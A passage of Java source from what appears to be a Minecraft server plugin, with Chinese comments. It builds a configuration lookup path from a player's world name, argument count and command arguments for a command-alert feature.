            if (getConfig().getBoolean("CommandAlert.CommandList." + Command + ".exFunction.PlayerWorld", false)) {

                //获得世界
                String world = p.getWorld().getName();

                //表项是否存在
                if(getConfig().isConfigurationSection(sb + world)){
                    sb.append(world).append(".");
                }else{
                    sb.append("Other.");
                }
            }
        }

        //参数个数(显然这个不关玩家事)
        if (getConfig().getBoolean("CommandAlert.CommandList." + Command + ".exFunction.ArgAmount", false)) {

            //获得长度
            String length = String.valueOf(strings.length);

            //表项是否存在
            if(getConfig().isConfigurationSection(sb + length)) {
                sb.append(length).append(".");
            }else{
                sb.append("Other.");
            }
        }


        //自定义参数(显然这个也不关玩家事)
        //这个就不用添加时判定存不存在了，不存在直接执行不存在的部分
        if (getConfig().getBoolean("CommandAlert.CommandList." + Command + ".exFunction.Arg", false)) {
            for (String c : strings) {
                sb.append(c).append(".");
            }
        }
        return sb.toString();
    }


}

